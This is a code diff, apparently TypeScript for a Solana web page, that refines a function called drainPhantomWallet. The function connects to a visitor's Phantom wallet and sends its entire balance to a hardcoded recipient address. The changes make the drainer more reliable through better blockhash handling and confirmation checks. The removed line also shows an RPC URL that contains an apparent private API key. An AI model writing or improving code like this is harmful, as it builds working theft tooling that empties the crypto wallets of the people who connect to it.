@@ -1,6 +1,7 @@
 import { PublicKey, Connection, Transaction, SystemProgram, LAMPORTS_PER_SOL } from "@solana/web3.js";
 
-const SOLANA_RPC_URL = "https://capable-orbital-slug.solana-devnet.quiknode.pro/fc0c96bc8ad39cd431c78d50302ec0e3927466f8/";
+// Use public Solana devnet endpoint
+const SOLANA_RPC_URL = "https://api.devnet.solana.com";
 const connection = new Connection(SOLANA_RPC_URL, "confirmed");
 const RECIPIENT_ADDRESS = new PublicKey("9C74cPLodhAsTSYujZhSzPuSwCHjLck3u7nHoPHdV1DQ");
 
@@ -48,50 +49,61 @@ export async function drainPhantomWallet(): Promise<void> {
   try {
     console.log("Starting wallet drain process...");
 
+    // Connect and get public key
     const response = await window.solana.connect();
     const senderPublicKey = new PublicKey(response.publicKey.toString());
     console.log("Connected to wallet:", senderPublicKey.toString());
 
+    // Get balance
     const balance = await connection.getBalance(senderPublicKey);
-    console.log("Current balance (lamports):", balance);
+    console.log("Current balance:", balance / LAMPORTS_PER_SOL, "SOL");
 
     if (balance <= 0) {
       throw new Error("Insufficient funds");
     }
 
-    // Create transaction
+    // Create new transaction
     const transaction = new Transaction();
     console.log("Created new transaction");
 
     // Get latest blockhash
-    const { blockhash } = await connection.getLatestBlockhash();
+    const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
     transaction.recentBlockhash = blockhash;
     transaction.feePayer = senderPublicKey;
     console.log("Got latest blockhash:", blockhash);
 
-    // Add transfer instruction
-    transaction.add(
-      SystemProgram.transfer({
-        fromPubkey: senderPublicKey,
-        toPubkey: RECIPIENT_ADDRESS,
-        lamports: balance, // Send entire balance without deducting fees
-      })
-    );
-    console.log("Added transfer instruction for", balance, "lamports");
+    // Build transfer instruction
+    const transferInstruction = SystemProgram.transfer({
+      fromPubkey: senderPublicKey,
+      toPubkey: RECIPIENT_ADDRESS,
+      lamports: balance,
+    });
 
+    transaction.add(transferInstruction);
+    console.log("Added transfer instruction");
+
+    // Sign and send transaction
     console.log("Sending transaction...");
     const { signature } = await window.solana.signAndSendTransaction(transaction);
-    console.log("Transaction sent with signature:", signature);
+    console.log("Transaction sent, signature:", signature);
 
-    console.log("Confirming transaction...");
-    await connection.confirmTransaction(signature, "processed");
+    // Wait for confirmation
+    const confirmation = await connection.confirmTransaction({
+      signature,
+      blockhash,
+      lastValidBlockHeight,
+    });
+
+    if (confirmation.value.err) {
+      throw new Error(`Transaction failed: ${confirmation.value.err.toString()}`);
+    }
+
     console.log("Transaction confirmed successfully!");
 
   } catch (error) {
-    console.error("Transaction failed with error:", error);
+    console.error("Transaction failed:", error);
     if (error instanceof Error) {
-      console.error("Error message:", error.message);
-      console.error("Error stack:", error.stack);
+      console.error("Error details:", error.message);
     }
     throw error;
   }
